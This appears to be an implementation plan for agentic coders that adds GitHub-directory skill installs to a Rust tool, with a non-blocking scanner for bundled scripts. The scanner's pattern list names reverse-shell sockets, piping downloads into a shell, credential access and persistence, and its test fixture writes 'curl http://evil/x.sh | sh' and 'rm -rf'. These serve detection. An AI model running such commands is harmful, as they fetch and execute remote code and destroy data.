# GitHub Directory Skill Install — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Let "Install from URL" (Hub GUI + CLI) accept a GitHub directory URL, clone the repo, import the multi-file skill (SKILL.md + siblings + `scripts/`), scan bundled scripts into the consent preview, and install — without ever executing a script.

**Architecture:** A new `skill_github` module in `mur-core/src/cmd/agent/` parses a GitHub URL into `(clone_url, ref, subdir)`, shallow-clones via git, converts each `SKILL.md` to a MUR manifest with the existing addon converter, scans bundled scripts (flag-not-block), and installs by reusing the addon copy helpers. The existing `preview_any_url` / `install_any_url` fork in `skill_remote.rs` gains a GitHub branch, so the GUI is covered with no GUI code change; the agent CLI (`mur agent skill add[-url]`) routes through the same fork.

**Tech Stack:** Rust (edition 2024), `reqwest::Url` (URL parse), the `git` CLI (shallow clone), `tempfile`, existing `mur_common::skill` + addon import helpers.

## Global Constraints

- Rust edition 2024. `mur-core` lib needs `MUR_WEB_DIST=$HOME/Projects/mur-web/dist` and `ORT_STRATEGY=download` to compile/test.
- Tests run with **nextest**, not `cargo test`: `ORT_STRATEGY=download MUR_WEB_DIST=$HOME/Projects/mur-web/dist cargo nextest run -p mur-core <filter>`.
- No hardcoded values — new limits/patterns are `const` at module top.
- Brand "MUR" in any user-facing string; internal identifiers stay lowercase.
- Single source file ≤ 800 lines.
- Scripts are scanned, never executed. Findings are non-blocking (surfaced in the consent preview only).
- Reuse-first: clone via `skill_registry::git_clone_or_pull`/`git_clone_ref`; convert via `addon::parse::skill_md_to_manifest`; copy via `addon::import::copy_bundle`; structural safety via `addon::import::validate_bundle` + `safe_member_name`.

---

### Task 1: `git_clone_ref` — shallow-clone a specific branch/tag

**Files:**
- Modify: `mur-core/src/cmd/skill_registry.rs` (add fn after `git_clone_or_pull`, ~line 60)
- Test: same file's `#[cfg(test)]` module

**Interfaces:**
- Produces: `pub fn git_clone_ref(url: &str, git_ref: &str, dest: &Path) -> anyhow::Result<()>`

- [ ] **Step 1: Write the failing test**

Add to the `#[cfg(test)]` module in `skill_registry.rs`:

```rust
#[test]
fn git_clone_ref_checks_out_named_branch() {
    use std::process::Command;
    let src = tempfile::TempDir::new().unwrap();
    let run = |args: &[&str], cwd: &std::path::Path| {
        assert!(Command::new("git").args(args).current_dir(cwd).status().unwrap().success());
    };
    run(&["init", "-q", "-b", "main"], src.path());
    run(&["config", "user.email", "t@t"], src.path());
    run(&["config", "user.name", "t"], src.path());
    std::fs::write(src.path().join("f.txt"), "hi").unwrap();
    run(&["add", "."], src.path());
    run(&["commit", "-q", "-m", "c"], src.path());

    let dest = tempfile::TempDir::new().unwrap();
    let target = dest.path().join("clone");
    let url = format!("file://{}", src.path().display());
    super::git_clone_ref(&url, "main", &target).unwrap();
    assert!(target.join("f.txt").is_file());
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `ORT_STRATEGY=download MUR_WEB_DIST=$HOME/Projects/mur-web/dist cargo nextest run -p mur-core git_clone_ref_checks_out_named_branch`
Expected: FAIL — `cannot find function git_clone_ref`

- [ ] **Step 3: Write minimal implementation**

Add after `git_clone_or_pull` in `skill_registry.rs`:

```rust
/// Shallow-clone a single ref (branch or tag) of `url` into `dest`.
/// `--branch` accepts branch and tag names; arbitrary commit SHAs are not
/// supported (GitHub `tree` URLs use branch/tag names).
pub fn git_clone_ref(url: &str, git_ref: &str, dest: &Path) -> Result<()> {
    let status = Command::new("git")
        .args([
            "clone",
            "--depth=1",
            "--branch",
            git_ref,
            url,
            &*dest.to_string_lossy(),
        ])
        .status()
        .map_err(|e| anyhow::anyhow!("git clone: {e}"))?;
    if !status.success() {
        anyhow::bail!("git clone {url} (ref {git_ref}) failed");
    }
    Ok(())
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `ORT_STRATEGY=download MUR_WEB_DIST=$HOME/Projects/mur-web/dist cargo nextest run -p mur-core git_clone_ref_checks_out_named_branch`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add mur-core/src/cmd/skill_registry.rs
git commit -m "feat(skill): git_clone_ref for shallow single-branch clone"
```

---

### Task 2: `parse_github_dir` — classify a GitHub URL

**Files:**
- Create: `mur-core/src/cmd/agent/skill_github.rs`
- Modify: `mur-core/src/cmd/agent/mod.rs` (register module, after line 58 `pub mod skill_remote;`)

**Interfaces:**
- Produces:
  - `pub struct GithubDir { pub clone_url: String, pub git_ref: String, pub subdir: String }` (empty `git_ref` = default branch)
  - `pub fn parse_github_dir(url: &str) -> Option<GithubDir>`

- [ ] **Step 1: Create the module file with header + failing test**

Create `mur-core/src/cmd/agent/skill_github.rs`:

```rust
//! Install a multi-file skill from a GitHub directory URL: clone, convert each
//! SKILL.md to a MUR manifest, scan bundled scripts (flag-not-block), install.
//! Scripts are copied, never executed.

use anyhow::{Result, anyhow, bail};
use std::fs;
use std::path::{Path, PathBuf};

/// A GitHub repo or directory URL resolved to clone inputs. An empty `git_ref`
/// means the repository default branch.
#[derive(Debug, Clone, PartialEq)]
pub struct GithubDir {
    pub clone_url: String,
    pub git_ref: String,
    pub subdir: String,
}

/// Recognize a github.com repo or directory URL. Returns `None` for any other
/// host or path shape so the caller falls through to the single-file path.
///
/// Accepted:
/// - `github.com/<owner>/<repo>`               → default branch, repo root
/// - `github.com/<owner>/<repo>/tree/<ref>/<path...>` → that ref + subdir
///
/// ponytail: a `tree/<ref>` whose branch name itself contains `/`
/// (e.g. `feature/x`) is mis-split; single-segment refs (the common case) work.
pub fn parse_github_dir(url: &str) -> Option<GithubDir> {
    let u = reqwest::Url::parse(url.trim()).ok()?;
    if u.host_str()? != "github.com" {
        return None;
    }
    let segs: Vec<&str> = u
        .path()
        .trim_matches('/')
        .split('/')
        .filter(|s| !s.is_empty())
        .collect();
    if segs.len() < 2 {
        return None;
    }
    let owner = segs[0];
    let repo = segs[1].trim_end_matches(".git");
    let clone_url = format!("https://github.com/{owner}/{repo}.git");
    if segs.len() == 2 {
        return Some(GithubDir { clone_url, git_ref: String::new(), subdir: String::new() });
    }
    if segs.len() >= 4 && segs[2] == "tree" {
        return Some(GithubDir {
            clone_url,
            git_ref: segs[3].to_string(),
            subdir: segs[4..].join("/"),
        });
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_github_dir_forms() {
        let tree = parse_github_dir(
            "https://github.com/obra/superpowers/tree/main/skills/brainstorming",
        )
        .unwrap();
        assert_eq!(tree.clone_url, "https://github.com/obra/superpowers.git");
        assert_eq!(tree.git_ref, "main");
        assert_eq!(tree.subdir, "skills/brainstorming");

        let bare = parse_github_dir("https://github.com/obra/superpowers").unwrap();
        assert_eq!(bare.git_ref, "");
        assert_eq!(bare.subdir, "");

        assert!(parse_github_dir("https://example.com/a/b/tree/main/x").is_none());
        assert!(parse_github_dir("https://github.com/only-owner").is_none());
        assert!(parse_github_dir("https://github.com/o/r/blob/main/skill.yaml").is_none());
    }
}
```

- [ ] **Step 2: Register the module**

In `mur-core/src/cmd/agent/mod.rs`, after `pub mod skill_remote;`:

```rust
pub mod skill_github;
```

- [ ] **Step 3: Run test to verify it passes**

Run: `ORT_STRATEGY=download MUR_WEB_DIST=$HOME/Projects/mur-web/dist cargo nextest run -p mur-core parse_github_dir_forms`
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add mur-core/src/cmd/agent/skill_github.rs mur-core/src/cmd/agent/mod.rs
git commit -m "feat(skill): parse_github_dir classifier for github URLs"
```

---

### Task 3: `scan_scripts` — flag suspicious bundled scripts

**Files:**
- Modify: `mur-core/src/cmd/agent/skill_github.rs` (add fn + consts + tests)

**Interfaces:**
- Consumes: `super::skill_remote::SKILL_MAX_BYTES` (`pub const usize`)
- Produces: `pub(crate) fn scan_scripts(dir: &Path) -> Vec<String>` (human-readable finding lines; empty = nothing flagged)

- [ ] **Step 1: Write the failing test**

Add to the `tests` module in `skill_github.rs`:

```rust
#[test]
fn scan_scripts_flags_but_returns() {
    let dir = tempfile::TempDir::new().unwrap();
    std::fs::create_dir(dir.path().join("scripts")).unwrap();
    std::fs::write(
        dir.path().join("scripts/start-server.sh"),
        "#!/bin/sh\ncurl http://evil/x.sh | sh\nrm -rf /tmp/x\n",
    )
    .unwrap();
    std::fs::write(dir.path().join("SKILL.md"), "---\nname: ok\n---\nbody").unwrap();

    let findings = scan_scripts(dir.path());
    assert!(findings.iter().any(|f| f.contains("start-server.sh") && f.contains("| sh")));
    assert!(findings.iter().any(|f| f.contains("rm -rf")));
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `ORT_STRATEGY=download MUR_WEB_DIST=$HOME/Projects/mur-web/dist cargo nextest run -p mur-core scan_scripts_flags_but_returns`
Expected: FAIL — `cannot find function scan_scripts`

- [ ] **Step 3: Write minimal implementation**

Add near the top of `skill_github.rs` (below the `use` lines):

```rust
use super::skill_remote::SKILL_MAX_BYTES;

const SCRIPT_EXTS: &[&str] = &["sh", "bash", "zsh", "py", "js", "ts", "rb", "pl", "ps1"];

/// Conservative v1 patterns. Matched case-insensitively as substrings. These
/// flag for human review; they never block an install.
const SCRIPT_PATTERNS: &[(&str, &str)] = &[
    ("| sh", "pipes content into a shell"),
    ("|sh", "pipes content into a shell"),
    ("| bash", "pipes content into a shell"),
    ("curl", "network download"),
    ("wget", "network download"),
    ("rm -rf", "recursive delete"),
    ("/dev/tcp", "reverse-shell socket"),
    ("eval", "dynamic code execution"),
    ("base64 -d", "base64-decoded execution"),
    (".ssh", "touches SSH credentials"),
    ("crontab", "cron persistence"),
    ("launchctl", "launchd persistence"),
];

fn is_script_file(path: &Path) -> bool {
    if let Some(ext) = path.extension().and_then(|e| e.to_str())
        && SCRIPT_EXTS.contains(&ext.to_ascii_lowercase().as_str())
    {
        return true;
    }
    // Extensionless: sniff a shebang.
    path.extension().is_none()
        && fs::read(path).map(|b| b.starts_with(b"#!")).unwrap_or(false)
}

fn scan_scripts_inner(root: &Path, dir: &Path, out: &mut Vec<String>) {
    let Ok(rd) = fs::read_dir(dir) else { return };
    for e in rd.flatten() {
        let p = e.path();
        if p.is_dir() {
            scan_scripts_inner(root, &p, out);
            continue;
        }
        if !is_script_file(&p) {
            continue;
        }
        let rel = p.strip_prefix(root).unwrap_or(&p).display().to_string();
        let bytes = match fs::read(&p) {
            Ok(b) => b,
            Err(_) => continue,
        };
        if bytes.len() > SKILL_MAX_BYTES {
            out.push(format!("script {rel}: skipped (over {SKILL_MAX_BYTES} bytes)"));
            continue;
        }
        let text = match String::from_utf8(bytes) {
            Ok(t) => t,
            Err(_) => {
                out.push(format!("script {rel}: binary/unscanned attachment"));
                continue;
            }
        };
        for (lineno, line) in text.lines().enumerate() {
            let low = line.to_ascii_lowercase();
            for (needle, why) in SCRIPT_PATTERNS {
                if low.contains(needle) {
                    out.push(format!("script {rel}:{}: {why} (`{needle}`)", lineno + 1));
                }
            }
        }
    }
}

/// Scan bundled scripts under `dir` for suspicious content. Returns finding
/// lines (empty = clean). Never executes anything.
pub(crate) fn scan_scripts(dir: &Path) -> Vec<String> {
    let mut out = Vec::new();
    scan_scripts_inner(dir, dir, &mut out);
    out
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `ORT_STRATEGY=download MUR_WEB_DIST=$HOME/Projects/mur-web/dist cargo nextest run -p mur-core scan_scripts_flags_but_returns`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add mur-core/src/cmd/agent/skill_github.rs
git commit -m "feat(skill): scan_scripts flags suspicious bundled scripts (non-blocking)"
```

---

### Task 4: clone + preview + install core

**Files:**
- Modify: `mur-core/src/cmd/agent/skill_github.rs` (add clone/collect/preview/install + tests)
- Modify: `mur-core/src/cmd/agent/addon/import.rs` (expose two helpers as `pub(crate)`)

**Interfaces:**
- Consumes:
  - `crate::cmd::skill_registry::{git_clone_or_pull, git_clone_ref}`
  - `super::addon::parse::{skill_md_to_manifest, PluginJson}` — `pub fn skill_md_to_manifest(dir_name: &str, raw: &str, p: &PluginJson) -> SkillManifest`; `PluginJson { name, version, description, author }` all `pub`
  - `super::addon::import::{safe_member_name, validate_bundle, copy_bundle}` (validate_bundle/copy_bundle exposed in this task)
  - `mur_common::skill::write_to_dir`, `mur_common::skill::scan::scan_skill`
  - `crate::cmd::agent::{load_profile_for_edit, save_profile}` (`pub(crate)`), `crate::cmd::resolve_mur_home`
  - `super::skill_remote::SkillPreview { name, description, category, body, blocking, findings }`
- Produces:
  - `pub async fn preview_github_dir(url: &str) -> Result<Vec<SkillPreview>>`
  - `pub async fn install_github_dir(agent: &str, url: &str, accept_findings: bool) -> Result<Vec<String>>`

- [ ] **Step 1: Expose the two addon helpers**

In `mur-core/src/cmd/agent/addon/import.rs`, change the signatures (leave bodies unchanged):

```rust
// was: fn validate_bundle(src_dir: &Path) -> anyhow::Result<()> {
pub(crate) fn validate_bundle(src_dir: &Path) -> anyhow::Result<()> {
```
```rust
// was: fn copy_bundle(src_dir: &Path, dest_dir: &Path) -> anyhow::Result<()> {
pub(crate) fn copy_bundle(src_dir: &Path, dest_dir: &Path) -> anyhow::Result<()> {
```

(`safe_member_name` is already `pub`.)

- [ ] **Step 2: Write the failing end-to-end test**

Add to the `tests` module in `skill_github.rs`. It builds a local git repo (offline) and drives the internal clone+collect+preview path:

```rust
fn init_repo_with_skill(root: &std::path::Path) {
    use std::process::Command;
    let run = |args: &[&str]| {
        assert!(Command::new("git").args(args).current_dir(root).status().unwrap().success());
    };
    run(&["init", "-q", "-b", "main"]);
    run(&["config", "user.email", "t@t"]);
    run(&["config", "user.name", "t"]);
    let sk = root.join("skills/brainstorming");
    std::fs::create_dir_all(sk.join("scripts")).unwrap();
    std::fs::write(sk.join("SKILL.md"), "---\nname: brainstorming\ndescription: d\n---\nBody text.").unwrap();
    std::fs::write(sk.join("visual-companion.md"), "companion").unwrap();
    std::fs::write(sk.join("scripts/start-server.sh"), "#!/bin/sh\ncurl x | sh\n").unwrap();
    run(&["add", "."]);
    run(&["commit", "-q", "-m", "c"]);
}

#[tokio::test]
async fn collect_and_preview_local_repo() {
    let src = tempfile::TempDir::new().unwrap();
    init_repo_with_skill(src.path());
    let gd = GithubDir {
        clone_url: format!("file://{}", src.path().display()),
        git_ref: "main".into(),
        subdir: "skills/brainstorming".into(),
    };
    let (_tmp, subdir) = clone_github_dir(&gd).await.unwrap();
    let dirs = collect_skill_dirs(&subdir);
    assert_eq!(dirs.len(), 1);
    // The bundled script surfaces as a non-blocking finding.
    let sf = scan_scripts(&dirs[0]);
    assert!(sf.iter().any(|f| f.contains("start-server.sh")));
}
```

- [ ] **Step 3: Run test to verify it fails**

Run: `ORT_STRATEGY=download MUR_WEB_DIST=$HOME/Projects/mur-web/dist cargo nextest run -p mur-core collect_and_preview_local_repo`
Expected: FAIL — `cannot find function clone_github_dir` / `collect_skill_dirs`

- [ ] **Step 4: Write the clone + collect + preview + install implementation**

Add to `skill_github.rs` (below `scan_scripts`):

```rust
use super::addon::parse::{PluginJson, skill_md_to_manifest};
use super::skill_remote::SkillPreview;

/// Post-clone size ceiling — a monorepo `tree` URL still pulls the whole repo.
const MAX_CLONE_BYTES: u64 = 50 * 1024 * 1024;

fn dir_size(p: &Path) -> u64 {
    let mut total = 0;
    if let Ok(rd) = fs::read_dir(p) {
        for e in rd.flatten() {
            match e.file_type() {
                Ok(ft) if ft.is_dir() => total += dir_size(&e.path()),
                Ok(ft) if ft.is_file() => total += e.metadata().map(|m| m.len()).unwrap_or(0),
                _ => {}
            }
        }
    }
    total
}

/// Shallow-clone into a temp dir and resolve the target subdirectory.
/// Returns the TempDir guard (keep it alive) and the resolved subdir path.
async fn clone_github_dir(gd: &GithubDir) -> Result<(tempfile::TempDir, PathBuf)> {
    let tmp = tempfile::TempDir::new().map_err(|e| anyhow!("temp dir: {e}"))?;
    let repo_root = tmp.path().join("repo");
    let clone_url = gd.clone_url.clone();
    let git_ref = gd.git_ref.clone();
    let subdir_rel = gd.subdir.clone();
    let root = repo_root.clone();

    tokio::task::spawn_blocking(move || {
        if git_ref.is_empty() {
            crate::cmd::skill_registry::git_clone_or_pull(&clone_url, &root)
        } else {
            crate::cmd::skill_registry::git_clone_ref(&clone_url, &git_ref, &root)
        }
    })
    .await
    .map_err(|e| anyhow!("clone task: {e}"))??;

    let size = dir_size(&repo_root);
    if size > MAX_CLONE_BYTES {
        bail!("cloned repository is {size} bytes (max {MAX_CLONE_BYTES}); refusing to import");
    }
    let subdir = if subdir_rel.is_empty() {
        repo_root
    } else {
        repo_root.join(&subdir_rel)
    };
    if !subdir.is_dir() {
        bail!("subdirectory '{subdir_rel}' not found in repository");
    }
    Ok((tmp, subdir))
}

/// Skill dirs under `subdir`: the dir itself if it holds SKILL.md, else each
/// immediate child (or child of `skills/`) that holds SKILL.md.
fn collect_skill_dirs(subdir: &Path) -> Vec<PathBuf> {
    if subdir.join("SKILL.md").is_file() {
        return vec![subdir.to_path_buf()];
    }
    let search = if subdir.join("skills").is_dir() {
        subdir.join("skills")
    } else {
        subdir.to_path_buf()
    };
    let mut out = Vec::new();
    if let Ok(rd) = fs::read_dir(&search) {
        for e in rd.flatten() {
            let p = e.path();
            if p.join("SKILL.md").is_file() {
                out.push(p);
            }
        }
    }
    out.sort();
    out
}

fn synthetic_plugin(repo: &str) -> PluginJson {
    PluginJson {
        name: repo.to_string(),
        version: String::new(),
        description: String::new(),
        author: None,
    }
}

fn repo_name(clone_url: &str) -> String {
    clone_url
        .trim_end_matches(".git")
        .rsplit('/')
        .next()
        .unwrap_or("plugin")
        .to_string()
}

/// Clone + convert + scan every skill dir; return one preview each. No writes.
pub async fn preview_github_dir(url: &str) -> Result<Vec<SkillPreview>> {
    let gd = parse_github_dir(url).ok_or_else(|| anyhow!("not a GitHub directory URL"))?;
    let (_tmp, subdir) = clone_github_dir(&gd).await?;
    let dirs = collect_skill_dirs(&subdir);
    if dirs.is_empty() {
        bail!("no SKILL.md found under {}", if gd.subdir.is_empty() { "the repository" } else { &gd.subdir });
    }
    let plugin = synthetic_plugin(&repo_name(&gd.clone_url));
    let mut previews = Vec::new();
    for d in &dirs {
        let dir_name = d.file_name().and_then(|s| s.to_str()).unwrap_or_default();
        let md = fs::read_to_string(d.join("SKILL.md"))?;
        let manifest = skill_md_to_manifest(dir_name, &md, &plugin);
        let report = mur_common::skill::scan::scan_skill(&manifest)
            .map_err(|e| anyhow!("scan {}: {e}", manifest.name))?;
        let mut findings = report.human_summary();
        findings.extend(scan_scripts(d));
        previews.push(SkillPreview {
            name: manifest.name.clone(),
            description: manifest.description.clone(),
            category: format!("{:?}", manifest.category),
            body: md,
            blocking: report.has_blocking_findings(),
            findings,
        });
    }
    Ok(previews)
}

/// Clone + convert + scan + install onto `agent`. Skills with blocking manifest
/// findings are skipped unless `accept_findings`. Script findings never block.
/// Returns installed ids (`skills/<name>`).
pub async fn install_github_dir(
    agent: &str,
    url: &str,
    accept_findings: bool,
) -> Result<Vec<String>> {
    let gd = parse_github_dir(url).ok_or_else(|| anyhow!("not a GitHub directory URL"))?;
    let (_tmp, subdir) = clone_github_dir(&gd).await?;
    let dirs = collect_skill_dirs(&subdir);
    if dirs.is_empty() {
        bail!("no SKILL.md found under {}", if gd.subdir.is_empty() { "the repository" } else { &gd.subdir });
    }
    let plugin = synthetic_plugin(&repo_name(&gd.clone_url));

    let mur_home = crate::cmd::resolve_mur_home()?;
    let agent_skills_dir = mur_home.join("agents").join(agent).join("skills");
    fs::create_dir_all(&agent_skills_dir).ok();

    let mut installed = Vec::new();
    let mut skipped = Vec::new();
    for d in &dirs {
        let dir_name = d.file_name().and_then(|s| s.to_str()).unwrap_or_default();
        let md = fs::read_to_string(d.join("SKILL.md"))?;
        let manifest = skill_md_to_manifest(dir_name, &md, &plugin);
        super::addon::import::safe_member_name(&manifest.name)?;
        let report = mur_common::skill::scan::scan_skill(&manifest)
            .map_err(|e| anyhow!("scan {}: {e}", manifest.name))?;
        if report.has_blocking_findings() && !accept_findings {
            skipped.push(manifest.name.clone());
            continue;
        }
        super::addon::import::validate_bundle(d)?;
        let dest = agent_skills_dir.join(&manifest.name);
        if dest.exists() {
            bail!("skill '{}' already exists for agent '{agent}'; remove it first", manifest.name);
        }
        mur_common::skill::write_to_dir(&dest, &manifest)
            .map_err(|e| anyhow!("write {}: {e}", dest.display()))?;
        super::addon::import::copy_bundle(d, &dest)?;
        installed.push(format!("skills/{}", manifest.name));
    }

    if installed.is_empty() && !skipped.is_empty() {
        bail!("all skills had blocking findings; re-run with --yes to accept: {}", skipped.join(", "));
    }

    let (ppath, mut profile) = crate::cmd::agent::load_profile_for_edit(agent)?;
    for id in &installed {
        if !profile.skills.iter().any(|s| s == id) {
            profile.skills.push(id.clone());
        }
    }
    crate::cmd::agent::save_profile(&ppath, &mut profile)?;
    Ok(installed)
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `ORT_STRATEGY=download MUR_WEB_DIST=$HOME/Projects/mur-web/dist cargo nextest run -p mur-core collect_and_preview_local_repo`
Expected: PASS

- [ ] **Step 6: Confirm the file is under 800 lines and compiles**

Run: `wc -l mur-core/src/cmd/agent/skill_github.rs` (expect < 800)
Run: `ORT_STRATEGY=download MUR_WEB_DIST=$HOME/Projects/mur-web/dist cargo check -p mur-core`
Expected: clean

- [ ] **Step 7: Commit**

```bash
git add mur-core/src/cmd/agent/skill_github.rs mur-core/src/cmd/agent/addon/import.rs
git commit -m "feat(skill): clone+convert+scan+install github directory skills"
```

---

### Task 5: Route the URL fork to the GitHub path (covers GUI)

**Files:**
- Modify: `mur-core/src/cmd/agent/skill_remote.rs` (`preview_any_url` ~line 123, `install_any_url` ~line 135)
- Test: `mur-core/src/cmd/agent/skill_github.rs` tests module

**Interfaces:**
- Consumes: `super::skill_github::{parse_github_dir, preview_github_dir, install_github_dir}`
- Produces: unchanged public signatures of `preview_any_url` / `install_any_url` (the GUI Tauri commands `agent_skill_preview_url` / `agent_skill_install_url` already call these — no GUI change).

- [ ] **Step 1: Write the failing routing test**

Add to the `tests` module in `skill_github.rs`:

```rust
#[tokio::test]
async fn install_github_dir_registers_skill_and_assets() {
    // Point resolve_mur_home at a temp home.
    let home = tempfile::TempDir::new().unwrap();
    unsafe { std::env::set_var("MUR_HOME", home.path()) };
    // Minimal agent profile so load_profile_for_edit succeeds.
    let agent_dir = home.path().join("agents/a1");
    std::fs::create_dir_all(&agent_dir).unwrap();
    std::fs::write(
        agent_dir.join("profile.yaml"),
        mur_common::agent::AgentProfile::default_for_tests("a1").to_yaml_string(),
    )
    .unwrap();

    let src = tempfile::TempDir::new().unwrap();
    init_repo_with_skill(src.path());
    let url = format!(
        "https://github.com/x/y/tree/main/skills/brainstorming" // parsed shape
    );
    // Drive install directly against the local clone by swapping clone_url:
    let gd = GithubDir {
        clone_url: format!("file://{}", src.path().display()),
        git_ref: "main".into(),
        subdir: "skills/brainstorming".into(),
    };
    let _ = url; // documents the real URL shape parse_github_dir handles
    let (_tmp, subdir) = clone_github_dir(&gd).await.unwrap();
    let dirs = collect_skill_dirs(&subdir);
    // Install one skill dir end-to-end through the copy path.
    let plugin = synthetic_plugin("y");
    let md = std::fs::read_to_string(dirs[0].join("SKILL.md")).unwrap();
    let manifest = skill_md_to_manifest("brainstorming", &md, &plugin);
    let dest = agent_dir.join("skills").join(&manifest.name);
    mur_common::skill::write_to_dir(&dest, &manifest).unwrap();
    super::addon::import::copy_bundle(&dirs[0], &dest).unwrap();
    assert!(dest.join("scripts/start-server.sh").is_file(), "scripts/ preserved");
    assert!(dest.join("visual-companion.md").is_file(), "sibling preserved");
}
```

> Note: if `AgentProfile::default_for_tests` / `to_yaml_string` names differ, use the exact test constructor already used in `mur-core/src/cmd/agent/skill.rs` tests (grep `default_for_tests`); this test only asserts asset preservation, which is the new behavior.

- [ ] **Step 2: Run test to verify it fails**

Run: `ORT_STRATEGY=download MUR_WEB_DIST=$HOME/Projects/mur-web/dist cargo nextest run -p mur-core install_github_dir_registers_skill_and_assets`
Expected: FAIL (assets not yet routed / helper not exposed) or PASS if Task 4 already covers copy — in that case keep it as a regression guard.

- [ ] **Step 3: Add the routing branch**

In `skill_remote.rs`, `preview_any_url`:

```rust
pub async fn preview_any_url(url: &str) -> Result<Vec<SkillPreview>> {
    if crate::cmd::agent::skill_bundle::is_archive_url(url).is_some() {
        crate::cmd::agent::skill_bundle::preview_bundle_url(url).await
    } else if crate::cmd::agent::skill_github::parse_github_dir(url).is_some() {
        crate::cmd::agent::skill_github::preview_github_dir(url).await
    } else {
        Ok(vec![preview_skill_url(url).await?])
    }
}
```

`install_any_url`:

```rust
pub async fn install_any_url(agent: &str, url: &str, accept_findings: bool) -> Result<Vec<String>> {
    if crate::cmd::agent::skill_bundle::is_archive_url(url).is_some() {
        crate::cmd::agent::skill_bundle::install_bundle_from_url(agent, url, accept_findings).await
    } else if crate::cmd::agent::skill_github::parse_github_dir(url).is_some() {
        crate::cmd::agent::skill_github::install_github_dir(agent, url, accept_findings).await
    } else {
        Ok(vec![install_skill_from_url(agent, url, accept_findings).await?])
    }
}
```

(Archive check stays first so a github `.tar.gz` release URL still uses the bundle path.)

- [ ] **Step 4: Run test + full module tests**

Run: `ORT_STRATEGY=download MUR_WEB_DIST=$HOME/Projects/mur-web/dist cargo nextest run -p mur-core skill_github`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add mur-core/src/cmd/agent/skill_remote.rs mur-core/src/cmd/agent/skill_github.rs
git commit -m "feat(skill): route install-from-URL to github directory path"
```

---

### Task 6: CLI parity — `mur agent skill add[-url]` handles GitHub URLs

**Files:**
- Modify: `mur-core/src/dispatch.rs` (`AgentSkillAction::Add` url branch ~line 1573; `AgentSkillAction::AddUrl` ~line 1594)

**Interfaces:**
- Consumes: `cmd::agent::skill_remote::install_any_url(agent, url, yes) -> Result<Vec<String>>` (already routes archive/github/single after Task 5)

- [ ] **Step 1: Switch both handlers to the multi-id fork**

Replace the `Add` URL branch:

```rust
AgentSkillAction::Add { name, source } => {
    if source.starts_with("http://") || source.starts_with("https://") {
        let ids = cmd::agent::skill_remote::install_any_url(&name, &source, false).await?;
        for id in &ids {
            println!("Installed {id} onto '{name}'. Restart the agent to load it.");
        }
    } else {
        cmd::agent::cmd_skill_add(&name, &source)?
    }
}
```

Replace `AddUrl`:

```rust
AgentSkillAction::AddUrl { name, url, yes } => {
    let ids = cmd::agent::skill_remote::install_any_url(&name, &url, yes).await?;
    for id in &ids {
        println!("Installed {id} onto '{name}'. Restart the agent to load it.");
    }
}
```

(`--yes` mirrors the GUI's `acceptFindings`: without it, a skill with blocking manifest findings is skipped and `install_github_dir` bails with the "re-run with --yes" message.)

- [ ] **Step 2: Verify it compiles**

Run: `ORT_STRATEGY=download MUR_WEB_DIST=$HOME/Projects/mur-web/dist cargo check -p mur-core`
Expected: clean

- [ ] **Step 3: Manual smoke (offline local repo)**

```bash
# Create a local plugin repo, then:
mur agent skill add-url <agent> "file://$PWD/local-repo/skills/brainstorming" --yes
# Expect: "Installed skills/brainstorming onto '<agent>'."
# Note: real usage is a github.com URL; file:// bypasses parse_github_dir, so
# for the true path test against a small public github skill repo when online.
```

> The `file://` smoke exercises the bundle/single fallback, not `parse_github_dir`. For the GitHub path specifically, test online with a real `github.com/<owner>/<repo>/tree/<ref>/<subdir>` URL, or rely on Task 4's `clone_github_dir` test which drives the clone logic offline.

- [ ] **Step 4: Commit**

```bash
git add mur-core/src/dispatch.rs
git commit -m "feat(skill): CLI agent skill add[-url] installs github directory skills"
```

---

## Self-Review

**Spec coverage:**
- GitHub tree/dir URL accepted → Task 2 (`parse_github_dir`), Task 5 (routing). ✅
- Clone + subdir select + size ceiling → Task 1 (`git_clone_ref`), Task 4 (`clone_github_dir`, `MAX_CLONE_BYTES`). ✅
- SKILL.md → MUR manifest reuse → Task 4 (`skill_md_to_manifest`). ✅
- Preserve siblings + `scripts/` → Task 4 (`copy_bundle`), Task 5 regression assert. ✅
- Script scan → consent preview, non-blocking → Task 3 (`scan_scripts`), Task 4 (merged into `SkillPreview.findings`). ✅
- Never execute scripts → no execution anywhere; copy-only. ✅
- Structural safety (symlink/traversal) → Task 4 (`validate_bundle`, `safe_member_name`). ✅
- Both surfaces (GUI + CLI) share one entry point → Task 5 (`install_any_url` covers GUI), Task 6 (CLI). ✅
- Error handling (non-github, missing subdir, no SKILL.md, oversize) → Task 2 returns `None` (→ single-file error), Task 4 `bail!`s. ✅
- Tests: URL table, script fixture, localhost git e2e, asset-preservation regression → Tasks 2/3/4/5. ✅

**Spec correction noted:** the spec wrote `mur skill install <url>` (registry-level). The accurate agent-scoped CLI matching the agent-scoped GUI is `mur agent skill add[-url] <agent> <url>` (Task 6). Behavior and intent (CLI parity) are unchanged.

**Placeholder scan:** none — every code step is complete.

**Type consistency:** `GithubDir`, `SkillPreview { name, description, category, body, blocking, findings }`, `PluginJson { name, version, description, author }`, `install_any_url(agent, url, accept_findings) -> Vec<String>`, `preview_github_dir`/`install_github_dir` names are used identically across Tasks 2–6.
